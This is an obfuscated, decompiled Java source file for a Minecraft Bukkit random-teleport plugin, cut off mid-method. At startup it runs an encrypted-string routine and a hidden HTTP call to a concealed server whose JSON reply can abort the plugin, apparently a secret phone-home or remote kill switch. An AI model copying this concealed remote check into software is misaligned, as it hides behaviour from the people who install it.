package ru.manus.funrtp;

import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.invoke.CallSite;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.lang.invoke.MutableCallSite;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.SocketTimeoutException;
import java.net.URL;
import java.security.MessageDigest;
import java.util.Arrays;
import java.util.Base64;
import java.util.logging.Logger;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import org.bukkit.plugin.java.JavaPlugin;
import ru.manus.funrtp.commands.AdminRTPCommand;
import ru.manus.funrtp.commands.RTPCommand;
import ru.manus.funrtp.menu.MenuListener;

public final class FunRTP extends JavaPlugin {
   private static FunRTP instance;
   static CallSite ΥκθΤΚΜΙΘΧμΛμΓοΕΨΗΔΖΞεγΥξΓΠΧΜΒηψΠΕβ;
   static CallSite ΤΖβσηΦΩχρσνΥΦΓζΔπΥΓΡΠπΧΟικΟΕβνφΑξδΩΣΟξκΖφΣυθγΤΔ;
   static CallSite ΥοΙΛητψΛΓρΕνυψΙαβηΜβνΠαζγΣΤΠΘΟαΠ;
   static CallSite ρΨΦΒΖΘΟΝρΘΠψστΒΝυΚυεΖοπεχεΣψμΖΟκρΨΩυΛΧΒ;
   static CallSite μαοΥυΦκΖΛΥΑψΦΝιφΘμπβΞΙΕΣηΞΣδΥΤΧπΧθΨΤ;
   static CallSite μοΤΘΩΓΕΦΥφΘΣΕΩΥΚτΧκψΞοωγγθχΦυΔΖυξΒρΤδσλΙ;
   static MutableCallSite ΟπθνΑβΙεφΑΔΠΩοΞΨΘΖνλΤζμΓΦιΖΤηψ;
   static MutableCallSite ΓμΚαΕιΖυΑΧΙΤωΝηπΞκΘΠΡΞΤνΤΝαΞΛζΖεγΖιΔΣΒΝνΠ;
   static CallSite πΣωυΠαλΜφβδΕΘαηΗΣανλεΓΙΛνΕΤιροχιΚρΗγχπΔπιηΟζσβΞχΕ;
   static MutableCallSite ΦξΙΘγωκολσΦΤμωεΞμΤσΗΣωωυΒΝκΚΧηοΟΦσΖΡΚθΥοδΛοΕν;
   static CallSite ΥοΕΤκυΙΓβΣγΦωαΝτσΖΓβΟμαΑΩΦμολαΡιξΙρεθΑΧψτΩη;
   static CallSite δαιΝαοΕΩβΑΗθΘΗΛηωοΦωδρΜψεντΜΧΕμχπΥΑΔΧΧαοΥΡΛτιρρΥζ;
   static CallSite φΓΤΜΑΚοοΔΡηΒπΙγιΞδΩχΠλΝφΛΒΩζΗζωυνζΖΣΥΟΝε;
   static CallSite δΕεΗηΓυχΔΤΩρφΜΙωΟΟΡΩΝαβδΒοχατΩιμηχΟοΜζΞΩψΩθΚΟΠΨυ;
   static MutableCallSite ΝΣΚΔξΩΟθΥΧρΜΟΝθζΗΩαΘΔμΖζτΜαΒΜΡΗΞΘΣοχΡζΙΗρ;
   static MutableCallSite ΤαγΦΟΓΤΛΛμλφδθΠυΕυμΠτΥΙφντΑιΤΝωρο;
   static CallSite ΑζσΗιΖΨρΤμπΞκσΠΙΕμΠΡαωπΕξγΧΠΤμ;
   static MutableCallSite θπημΜεΨιγΣηΒΙΑΩΒΞξπρεΓωχΖΡρντΔΜδΠαθζτΞχλγχι;
   static CallSite ΥαυΦΑπΙΒπνσΙΗΒψμΦΨηυΩΛΣδιηυινσΨζπψΛδπτ;
   static MutableCallSite ιφΓτΟξμαΕΚΛθνΒΠψΜΕυμγΤΧηΠορηΡΠμΩΕα;
   static MutableCallSite πΑΑκΒδΧεΨΒβιηοΣψΒηυΗΛρθυΨΣνΤβΚυ;
   static CallSite ΣΦΔΥΚοαΙκφΙοεψΖΟΔβψψΕΥΚΦπσωΡεΘΡτΑΓρΞωΨΛθ;
   static MutableCallSite χΒαβνγΧΨνΙψνΛξΚθζΔΞτωΓτΣΗηΥΜκΕβεΚξΧΗπνΣωφβ;
   static MutableCallSite ΩηψΘΓΨουζψτγΙΓψοΧΧΙιρτωΗψΥφαβμζρ;
   static CallSite οεΕΤθΥνΛΙιθΧωνηΥΧΖΧΡΣοτΗΤΤζΑΡΤΙγψΟΦνψιξξΡνΥεβΜ;
   static CallSite ΟλΡηΘΕνΙνητΓΔνΥΙρΗγβηηΨηΘρδΒΕψιΜιωφψοΝτφΕωΜΤΘΙ;
   static CallSite θψΝΧζΑΩΦΣΜιαγγΕΡΒΖαΩλεΠΗΧΔΚοδτΗΠΦαΙΓΞΕξΑΨ;
   static MutableCallSite νΟΥΣΦηκσδτΖρΟεκηζνΛΘγΔπχΦΗαΘκΞΦμΛΩγδΡεΚΗΝΩυψΦΞΝΚ;
   static CallSite ιΟΩψωΨξλχθΧΙΔιΥσΥωμοΝΜωξυαΠΖηπΗθΧκΚδΤκδ;
   static MutableCallSite ΤφζΦΔΩφωΥφΔχθδΡομμΞλΣΖψνγππνδΦΙΜΗΑΗΩ;
   static CallSite ΙγΜΝμτζκμλΚΣΟΤταλΞΟΨΩΕΗΦΒΦυΤΖΨπΝΧΕΩδτφΜπΞζΗτΓ;
   static CallSite ΘζΜυΑΥΑφΑιυΓζΑΙΜεΡσΔΙβλζψΙΡΔΘσΘΧΔΣοχΟΛ;
   static MutableCallSite ζΨχΓΕΣαΥΣδΗδΨηΟΥλΤδΡΞβΥΚΟΙπωΝλΨζιΓζΞΛξΚξδΣχ;
   static CallSite ληΕΒηΜψχλΨΩψΣΟΖΥδρτθΤΕχδΜρΗπησΗΜγσκφΚγ;
   static MutableCallSite ΧΩΔνΟκιοΛΙΛτΖμΨζξΗαΞφεΘφηΡζωφατΚψθρΠΑψγρμο;
   static CallSite ΒΚησνκψΔσσζωλΙΘΠβυφΓτυΦΨκχΔηΑΙδΟφκΙΔξλ;
   static MutableCallSite ΙΔφΙηψδΣδΥδζΚΜΜΗΣΣΕΘΞΞΗΒρψΑΜΧΡφ;
   static CallSite αρΥΝξυΒΒΗΘΔΚΚΟΞνΜΙυΟΙΙγαψΛνΙθΜμΛΦΧοΒηοΣωρφψφσΠΓο;
   static CallSite ζγκΟΩΣψΞΙβΦΥξΚαοΡΕμΚοΦχαξμΖζγΨΞΓαπΤνΧΞγΒ;
   static MutableCallSite φΛΦπτθΤαμλΗζΔΛθΜΛΜφΒφρΤλΙστΡΨΦΒΨσ;
   static MutableCallSite ΨΔΧΙχΞγηΖνΣΣΔΥΤυΙΝΖΜΟΒηξδΝΗωΔΝΕθτφτΠο;
   static MutableCallSite νΓΡΙωΔαΥΗδΣΕτκΔμαΜΧΕΨΓνΞσμΠΒΒωΓΜΣ;
   static CallSite αΓΛβσΟκΠΙθΙΠΖΞΟμΩηΔΚβΛΑΨΠυΕΩνΡυΤλΣΞδφ;
   static CallSite ΓΕψτΙψΧεξΩαχΓΘοθΘΦΨλκνΗΜΒΣκχΣΚτοΤΠξ;
   static MutableCallSite ιΗφχτδΕΡκΚθεΣδαΘμΔγρΔΓΟΓγνΕψαληΙωΜΕΑωΝπκβΝ;
   static MutableCallSite νΡΒτεΑΣκΙχΥκΧΕΡΙηΔωαΝδσΞΜΔΧΠσρξΞ;
   static MutableCallSite τμΠοΣΚΕΩψψβψωαψΟβΕεΑΞεΛΕΗλΙΔκβεΡσλπΞΠΕ;
   static CallSite ΞΧνΛβΦΨωΦαΤδΒΥΦΡγΞΡΤεΡτΓεΞνΚνΝΧΡωΑΥεΝβΞ;
   static CallSite βΔπΛωΝΡκΖΣυΞΚζζαβφρρΘμΙζφΑΝΨΗΝηνΠΝΒΩδπΨνψΓΜΙ;
   static CallSite ΛΓδλψΕλΓψΑηηΥΘΛζαιθδΖζωΤΛΝΒξκοΗρξΘγθΓυΗΒ;
   static CallSite ΧΧΣΠφΧωφΑξΔφδμφΓψζΖΕΚΡΜΩΨΠδοΡεΛψκΗψΙαθτνΛαΘηω;
   static MutableCallSite ΨσοΜΨψσδΟυΔαΞαΠΔΣΤηΨλΦΠβΜΒσΟΤκΧΛσ;
   static MutableCallSite ΤΟνΔχδΠρΦθΕζσΒΙΥηΠγνΠΔΛρΞχνΜΥωχΗπ;
   static CallSite ψρβηΞΛΚτλΕοΛΩΧμεχΗεΦηωΝζησθηΑΣΓΦΧοΘκΠθΕΒΥ;
   static MutableCallSite κΣΝΞΧΗΑΑοΥΔμχΛΡΚΞΖΝΛψπΔλΧγθΧΓΩπιξΧΓΜΞαΗτωτΓ;
   static CallSite φοωζΑηΝχΛΗιπβυΨΧΒσΩηιξΒχθΩμιΙΧΩεθγχΟΟ;
   static MutableCallSite ΥΕωΝκΠΙΥξψΜΒρΡψαΡΞξΑηδχδΥψαΘιΩΧφΚζυΖΦαΤδνΚηζζ;
   static MutableCallSite ΜηλΙτΔΜοΜνηΙΓχσΗΗοβιΞΒΙΘνθλξΜθΙτΞΕη;
   static MutableCallSite ΤρωζΚπΠσΔΘωΧρΤαδΥΨαεΛξοαΧειΗζιΥΕΤνΨαρΘ;
   private static final String BLACK_MINECRAFT_1067 = "https://black-minecraft.com/resources/10201/";

   public void onEnable() {
      boolean var10000 = false;
      StackTraceElement var1337 = (new Throwable()).getStackTrace()[0];
      String var1 = new String(αηΣΒΧΠσοξνξω("nyLhspRWGa4IRVKKyxfCBZ8i4bKUVhmuCEVSissXwgVT3dn7nWPdP/wJuGBhnwL6".getBytes(), var1337));
      var1337 = (new Throwable()).getStackTrace()[0];
      new String(αηΣΒΧΠσοξνξω("nyLhspRWGa4IRVKKyxfCBZ8i4bKUVhmuCEVSissXwgVT3dn7nWPdP/wJuGBhnwL6".getBytes(), var1337));
      var1337 = (new Throwable()).getStackTrace()[0];
      String var3 = new String(αηΣΒΧΠσοξνξω("1z7VymQWYms3vRIOTD92Ls4Amae9lYkCntCUdQ6QZhEXV2nvhgWZ+1xE7+LcP6QC".getBytes(), var1337));
      var1337 = (new Throwable()).getStackTrace()[0];
      String var4 = new String(αηΣΒΧΠσοξνξω("KWhck0SaPmfbPerneCNobg==".getBytes(), var1337));
      var1337 = (new Throwable()).getStackTrace()[0];
      String var5 = new String(αηΣΒΧΠσοξνξω("nkQduW6/GElIHRPy3i9UnOTkS5Lg4iUL6yDJ7asB1xM=".getBytes(), var1337));
      var1337 = (new Throwable()).getStackTrace()[0];
      String var6 = new String(αηΣΒΧΠσοξνξω("F8bkH3GBmxr2kFbfpbicfo+oWSuk6QxUvFqphYqPqJ0=".getBytes(), var1337));
      var1337 = (new Throwable()).getStackTrace()[0];
      String var7 = new String(αηΣΒΧΠσοξνξω("5d0lOXR1mO08PG5t0yxO7SnMv4/SLh4chsksyrxWYuOnBP8IqvsH8DHylCxxLMtjJfnPs23I34YvuUZzUJZ80gfDr97JUA33aTCfcuwccEA=".getBytes(), var1337));
      var1337 = (new Throwable()).getStackTrace()[0];
      String var1379 = new String(αηΣΒΧΠσοξνξω("1z7VymQWYms3vRIOTD92Ls4Amae9lYkCntCUdQ6QZhGHCuA+GhrrKPK0FSqSn2Gd".getBytes(), var1337));
      boolean var10001 = false;
      String var8 = var1379;
      var1337 = (new Throwable()).getStackTrace()[0];
      String var9 = new String(αηΣΒΧΠσοξνξω("AuDStT6lG6LapZW7m/8Tf3iO/L78tiEk/sNOYhtGSBwe8LkjUdNgujDf5lukObC1".getBytes(), var1337));
      var1337 = (new Throwable()).getStackTrace()[0];
      String var10 = new String(αηΣΒΧΠσοξνξω("6uY77pXtGYWjwZq0ZKPFwY/Gbf8KVLU+auJ2qI60iSEeThVX498kO/cBG4v5owT3jJQ8KSvX27LP1/xovY2bmQ==".getBytes(), var1337));
      var1337 = (new Throwable()).getStackTrace()[0];
      String var11 = new String(αηΣΒΧΠσοξνξω("GB1Te7XtMnbZLJG0oVn+x+COPlKx7p7D7qGeNLcq8zLB5XO6KjdwFw+/2TdyoqNxc7BmXK3h4Tm6YCT1SQd9TXMZA9Pq2xmjvUQntB5Dk3M=".getBytes(), var1337));
      var1337 = (new Throwable()).getStackTrace()[0];
      String var12 = new String(αηΣΒΧΠσοξνξω("Va/A8sxa+tv1wJZ9uneRxwtpqPlFWRbpsXOEnMnYbV8=".getBytes(), var1337));
      var1337 = (new Throwable()).getStackTrace()[0];
      String var13 = new String(αηΣΒΧΠσοξνξω("kbbV3pJKxU73GdDMvkQMubGSvi7SNCqE348lSAIYYskFtUodhQYNdFMTHaeW5pFE".getBytes(), var1337));
      var1337 = (new Throwable()).getStackTrace()[0];
      String var14 = new String(αηΣΒΧΠσοξνξω("GB1Te7XtMnbZLJG0oVn+x+COPlKx7p7D7qGeNLcq8zLB5XO6KjdwFw+/2TdyoqNxc7BmXK3h4Tm6YCT1SQd9TXMZA9Pq2xmjvUQntB5Dk3M=".getBytes(), var1337));
      var1337 = (new Throwable()).getStackTrace()[0];
      new String(αηΣΒΧΠσοξνξω("nyLhspRWGa4IRVKKyxfCBZ8i4bKUVhmuCEVSissXwgVT3dn7nWPdP/wJuGBhnwL6".getBytes(), var1337));

      try {
         var1337 = (new Throwable()).getStackTrace()[0];
         URL var16 = new URL(new String(αηΣΒΧΠσοξνξω("davzK3mZWOdr7C1tJSxFB0CBZTAroP/pKY8+c38C+PO+KnhqByBUamels7iAwlka7+tWDtWFJpN6JOKO6OdMBA==".getBytes(), var1337)));
         HttpURLConnection var17 = (HttpURLConnection)var16.v<invokedynamic>(var16);
         var17.v<invokedynamic>(var17, 5000);
         int var10002 = 5;
         boolean var10003 = true;
         var17.v<invokedynamic>(var17, 7000);
         var1337 = (new Throwable()).getStackTrace()[0];
         String var1386 = new String(αηΣΒΧΠσοξνξω("bU27j/1Q9xOwsLdFb8bbeQ==".getBytes(), var1337));
         var1337 = (new Throwable()).getStackTrace()[0];
         var17.v<invokedynamic>(var17, var1386, new String(αηΣΒΧΠσοξνξω("obD49gypr0XRbbsdzezYWQ==".getBytes(), var1337)));
         var1337 = (new Throwable()).getStackTrace()[0];
         var1386 = new String(αηΣΒΧΠσοξνξω("8NmToyq56pTBYdHLoHbnbA==".getBytes(), var1337));
         var1337 = (new Throwable()).getStackTrace()[0];
         var17.v<invokedynamic>(var17, var1386, new String(αηΣΒΧΠσοξνξω("6Uz/fu3TG7WAUDICcZHL9RyDd9HoJT27eMWleZ3sPWxWoAvch0J+MfWDlgRkCb3D".getBytes(), var1337)));
         var1337 = (new Throwable()).getStackTrace()[0];
         var1386 = new String(αηΣΒΧΠσοξνξω("2gr3L5VPCj6g4802Y4owyw==".getBytes(), var1337));
         var1337 = (new Throwable()).getStackTrace()[0];
         var17.v<invokedynamic>(var17, var1386, new String(αηΣΒΧΠσοξνξω("PBOwQuEfp3CS4RRrbKK5ebBpDtRZMysk+b9I79PtfdWMlDwpK9fbss/X/Gi9jZuZ".getBytes(), var1337)));
         var1337 = (new Throwable()).getStackTrace()[0];
         var17.v<invokedynamic>(var17, new String(αηΣΒΧΠσοξνξω("UIj92kQFDxzLSG0GYb7i2w==".getBytes(), var1337)));
         var17.v<invokedynamic>(var17, true);
         var1337 = (new Throwable()).getStackTrace()[0];
         var1379 = new String(αηΣΒΧΠσοξνξω("qbJ2ZlokVTRcKAcqKfO5XWK1dgwZAtaEcgcbDMa3x90=".getBytes(), var1337));
         Class var18 = var1379.w<invokedynamic>(var1379);
         var1337 = (new Throwable()).getStackTrace()[0];
         var1379 = new String(αηΣΒΧΠσοξνξω("qbJ2ZlokVTRcKAcqKfO5XZOnQTH5daT1U5dlL9ATpPc=".getBytes(), var1337));
         Class var19 = var1379.w<invokedynamic>(var1379);
         int var20 = var17.v<invokedynamic>(var17);
         if (var20 == 200) {
            var1337 = (new Throwable()).getStackTrace()[0];
            var1386 = new String(αηΣΒΧΠσοξνξω("z+N8a5Pt5+4iUmA64ybbqg==".getBytes(), var1337));
            var10002 = 1 & -30;
            Method var1384 = var19.v<invokedynamic>(var19, var1386, new Class[0]);
            var1337 = (new Throwable()).getStackTrace()[0];
            Class var1390 = (new String(αηΣΒΧΠσοξνξω("qbJ2ZlokVTRcKAcqKfO5XTPbptJFgb9WJv05cxMxEsw=".getBytes(), var1337))).w<invokedynamic>(new String(αηΣΒΧΠσοξνξω("qbJ2ZlokVTRcKAcqKfO5XTPbptJFgb9WJv05cxMxEsw=".getBytes(), var1337)));
            var1337 = (new Throwable()).getStackTrace()[0];
            var1390 = var1390.v<invokedynamic>(var1390, new String(αηΣΒΧΠσοξνξω("7jDoLs26SuxytpfXNWDR4g==".getBytes(), var1337)), new Class[]{String.class});
            var1337 = (new Throwable()).getStackTrace()[0];
            Method var1395 = var19.v<invokedynamic>(var19, new String(αηΣΒΧΠσοξνξω("+M5lqveVxXPhDWo248jhmw==".getBytes(), var1337)), new Class[0]);
            var1337 = (new Throwable()).getStackTrace()[0];
            String var10004 = new String(αηΣΒΧΠσοξνξω("tdkBTm2t88FdJFFR5ALB6Q==".getBytes(), var1337));
            Class[] var10005 = new Class[1];
            var1337 = (new Throwable()).getStackTrace()[0];
            String var10008 = new String(αηΣΒΧΠσοξνξω("wux794iiUxOboa6+CGU4cA==".getBytes(), var1337));
            var10005[0] = var10008.w<invokedynamic>(var10008);
            Method var1398 = var18.v<invokedynamic>(var18, var10004, var10005);
            Object var1396 = var1395.v<invokedynamic>(var1395, var1398.v<invokedynamic>(var1398, var18.v<invokedynamic>(var18, new Class[0]).v<invokedynamic>(var18.v<invokedynamic>(var18, new Class[0]), new Object[0]), new Object[]{new InputStreamReader(var17.v<invokedynamic>(var17))}), new Object[0]);
            Object[] var1399 = new Object[1];
            var1337 = (new Throwable()).getStackTrace()[0];
            var1399[0] = new String(αηΣΒΧΠσοξνξω("4evQnnjkJgb3IslBt5dMBw==".getBytes(), var1337));
            Object var1392 = var1390.v<invokedynamic>(var1390, var1396, var1399);
            if (((Boolean)var1384.v<invokedynamic>(var1384, var1392, new Object[0])).v<invokedynamic>((Boolean)var1384.v<invokedynamic>(var1384, var1392, new Object[0]))) {
               throw new RuntimeException("\n" + var3 + "\n" + var4 + "\n" + var5 + "\n" + var6 + "\n" + var7 + "\n" + var8 + "\n");
            }
         }
      } catch (SocketTimeoutException var1338) {
         System.err.v<invokedynamic>(System.err, var1);
         System.err.v<invokedynamic>(System.err, var9);
         System.err.v<invokedynamic>(System.err, var10);
         System.err.v<invokedynamic>(System.err, var11);
         System.err.v<invokedynamic>(System.err, var1);
      } catch (NoSuchMethodException | InstantiationException | IllegalAccessException | RuntimeException | IOException | InvocationTargetException | ClassNotFoundException var1339) {
         if (var1339 instanceof RuntimeException && var1339.v<invokedynamic>(var1339) != null) {
            var1379 = var1339.v<invokedynamic>(var1339);
            var1337 = (new Throwable()).getStackTrace()[0];
            if (var1379.v<invokedynamic>(var1379, new String(αηΣΒΧΠσοξνξω("1z7VymQWYms3vRIOTD92Ls4Amae9lYkCntCUdQ6QZhEXV2nvhgWZ+1xE7+LcP6QC".getBytes(), var1337)))) {
               throw (RuntimeException)var1339;
            }
         }

         System.err.v<invokedynamic>(System.err, var1);
         System.err.v<invokedynamic>(System.err, var9 + var1339.v<invokedynamic>(var1339));
         System.err.v<invokedynamic>(System.err, var10);
         System.err.v<invokedynamic>(System.err, var11);
         System.err.v<invokedynamic>(System.err, var1);
      } catch (Throwable var1340) {
         if (var1340.v<invokedynamic>(var1340) != null) {
            var1379 = var1340.v<invokedynamic>(var1340);
            var1337 = (new Throwable()).getStackTrace()[0];
            if (var1379.v<invokedynamic>(var1379, new String(αηΣΒΧΠσοξνξω("1z7VymQWYms3vRIOTD92Ls4Amae9lYkCntCUdQ6QZhEXV2nvhgWZ+1xE7+LcP6QC".getBytes(), var1337)))) {
               throw new RuntimeException(var1340.v<invokedynamic>(var1340), var1340);
            }
         }

         System.err.v<invokedynamic>(System.err, var1);
         System.err.v<invokedynamic>(System.err, var12 + var1340.v<invokedynamic>(var1340));
         System.err.v<invokedynamic>(System.err, var13);
         System.err.v<invokedynamic>(System.err, var14);
         System.err.v<invokedynamic>(System.err, var1);
      }

      instance = this;
      this.v<invokedynamic>(this);
      var1337 = (new Throwable()).getStackTrace()[0];
      String var1393 = new String(αηΣΒΧΠσοξνξω("1nzYgZUOFvuGozYqQ5Fnuw==".getBytes(), var1337));
      boolean var1397 = false;
      this.v<invokedynamic>(this, var1393).v<invokedynamic>(this.v<invokedynamic>(this, var1393), new RTPCommand());
      AdminRTPCommand var1341 = new AdminRTPCommand();
      var1337 = (new Throwable()).getStackTrace()[0];
      this.v<invokedynamic>(this, new String(αηΣΒΧΠσοξνξω("oA15XkM3e2gANX6lSvtP2g==".getBytes(), var1337))).v<invokedynamic>(this.v<invokedynamic>(this, new String(αηΣΒΧΠσοξνξω("oA15XkM3e2gANX6lSvtP2g==".getBytes(), var1337))), var1341);
      var1337 = (new Throwable()).getStackTrace()[0];
      this.v<invokedynamic>(this, new String(αηΣΒΧΠσοξνξω("oA15XkM3e2gANX6lSvtP2g==".getBytes(), var1337))).v<invokedynamic>(this.v<invokedynamic>(this, new String(αηΣΒΧΠσοξνξω("oA15XkM3e2gANX6lSvtP2g==".getBytes(), var1337))), var1341);
      this.v<invokedynamic>(this).getPluginManager().registerEvents(new MenuListener(), this);
      Logger var1385 = this.v<invokedynamic>(this);
      var1337 = (new Throwable()).getStackTrace()[0];
      var1385.v<invokedynamic>(var1385, new String(αηΣΒΧΠσοξνξω("Xm1PQzBdZp3JOik/MPYoGNjhXIgcX67RiEccf8VQvP5n1kRBFsuPzsX06UbpHVSy".getBytes(), var1337)));
   }

   public void onDisable() {
      this.getLogger().info("FunRTP отключен!");
   }

   public static FunRTP getInstance() {
      return instance;
   }

   public static byte[] αηΣΒΧΠσοξνξω(byte[] var0, StackTraceElement var1) {
      MessageDigest var2 = MessageDigest.getInstance("MD5");
      byte[] var3 = Arrays.copyOf(var2.digest((var1.getClassName() + var1.getMethodName()).getBytes()), 32);
      Cipher var4 = Cipher.getInstance("AES/ECB/PKCS5Padding");
      SecretKeySpec var5 = new SecretKeySpec(var3, "AES");
      var4.init(2, var5);
      byte[] var6 = var4.doFinal(Base64.getDecoder().decode(var0));
      byte[] var7 = var6;
      int var8 = var6.length;

      for(int var9 = 0; var9 < var8; ++var9) {
         var7[var9] = (byte)(var7[var9] ^ 90);
      }

      return var7;
   }

   public static MethodHandle BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb(String var0, String var1, String var2, int var3) throws Throwable {
      MethodHandles.Lookup var4 = MethodHandles.lookup();
      Class var5 = Class.forName(var0);
      MethodType var6 = MethodType.fromMethodDescriptorString(var2, var5.getClassLoader());
      if ((var3 & 2) != 0) {
         return var4.findStatic(var5, var1, var6);
      } else {
         return (var3 & 4) != 0 ? var4.findVirtual(var5, var1, var6) : null;
      }
   }

   static CallSite πρζΩιωΥκωΡΤγΧηΒοΒΔγΟΠγγΡηΗΨνΠκΩΨτΖοΦΜ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.net.URL", "openConnection", "()Ljava/net/URLConnection;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(ΥκθΤΚΜΙΘΧμΛμΓοΕΨΗΔΖΞεγΥξΓΠΧΜΒηψΠΕβ = new MutableCallSite(var3.type()))).setTarget(var3);
         return ΥκθΤΚΜΙΘΧμΛμΓοΕΨΗΔΖΞεγΥξΓΠΧΜΒηψΠΕβ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite βΡγΔηυΦθπΝΚΛΝΚΙΠΡΧΜεΗΓΗγΑνσυΤμξΠΧεΜΔΙξιΩκΜζσκτ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.net.HttpURLConnection", "setConnectTimeout", "(I)V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(ΤΖβσηΦΩχρσνΥΦΓζΔπΥΓΡΠπΧΟικΟΕβνφΑξδΩΣΟξκΖφΣυθγΤΔ = new MutableCallSite(var3.type()))).setTarget(var3);
         return ΤΖβσηΦΩχρσνΥΦΓζΔπΥΓΡΠπΧΟικΟΕβνφΑξδΩΣΟξκΖφΣυθγΤΔ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΜαΙΝηηλωβΨηΕΕΨωΗβΣρΜβΚΡψφΦΓΘοτΒΚΕΙ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.net.HttpURLConnection", "setReadTimeout", "(I)V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(ΥοΙΛητψΛΓρΕνυψΙαβηΜβνΠαζγΣΤΠΘΟαΠ = new MutableCallSite(var3.type()))).setTarget(var3);
         return ΥοΙΛητψΛΓρΕνυψΙαβηΜβνΠαζγΣΤΠΘΟαΠ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ζδγγΘμκΙΘΓΤξΥΣΟωηΨΔσΓΣχΔθΓρΦΑαΒΔ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.net.HttpURLConnection", "setRequestProperty", "(Ljava/lang/String;Ljava/lang/String;)V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(ρΨΦΒΖΘΟΝρΘΠψστΒΝυΚυεΖοπεχεΣψμΖΟκρΨΩυΛΧΒ = new MutableCallSite(var3.type()))).setTarget(var3);
         return ρΨΦΒΖΘΟΝρΘΠψστΒΝυΚυεΖοπεχεΣψμΖΟκρΨΩυΛΧΒ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ζδσΔκιαΒΨΔζΥοδζφΧρΤΟτΖΣγγτννμηΙΤΓγΖμκβΖεκΜμψΠβ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.net.HttpURLConnection", "setRequestProperty", "(Ljava/lang/String;Ljava/lang/String;)V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(μαοΥυΦκΖΛΥΑψΦΝιφΘμπβΞΙΕΣηΞΣδΥΤΧπΧθΨΤ = new MutableCallSite(var3.type()))).setTarget(var3);
         return μαοΥυΦκΖΛΥΑψΦΝιφΘμπβΞΙΕΣηΞΣδΥΤΧπΧθΨΤ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite φΠμβΠρρΡδΗσξξπδΠΖΞΥιξΕΞΘαφβωνΕΓΖζαεπΑκτΘαδσωΣΕ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.net.HttpURLConnection", "setRequestProperty", "(Ljava/lang/String;Ljava/lang/String;)V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(μοΤΘΩΓΕΦΥφΘΣΕΩΥΚτΧκψΞοωγγθχΦυΔΖυξΒρΤδσλΙ = new MutableCallSite(var3.type()))).setTarget(var3);
         return μοΤΘΩΓΕΦΥφΘΣΕΩΥΚτΧκψΞοωγγθχΦυΔΖυξΒρΤδσλΙ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ιεβπεθνρδΚχΒΙΙΔΓασοααητΑΧΛππΙΙΒΞΝΝψρΞΒΚΧ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.net.HttpURLConnection", "setRequestMethod", "(Ljava/lang/String;)V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (ΟπθνΑβΙεφΑΔΠΩοΞΨΘΖνλΤζμΓΦιΖΤηψ = new MutableCallSite(var3.type())).setTarget(var3);
         return ΟπθνΑβΙεφΑΔΠΩοΞΨΘΖνλΤζμΓΦιΖΤηψ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite αΕσΗΒφμΤπφτοευΕΗσωηΔδΖΧΚγΟκΙδΘυΞΜΥΡζδπζΟφκΛΒΡΗΔθ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.net.HttpURLConnection", "setInstanceFollowRedirects", "(Z)V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (ΓμΚαΕιΖυΑΧΙΤωΝηπΞκΘΠΡΞΤνΤΝαΞΛζΖεγΖιΔΣΒΝνΠ = new MutableCallSite(var3.type())).setTarget(var3);
         return ΓμΚαΕιΖυΑΧΙΤωΝηπΞκΘΠΡΞΤνΤΝαΞΛζΖεγΖιΔΣΒΝνΠ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΡΛΣΥΨΕρεδΤΗηλησξδδΖΧΓΣιμΦΚιμηΦω(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
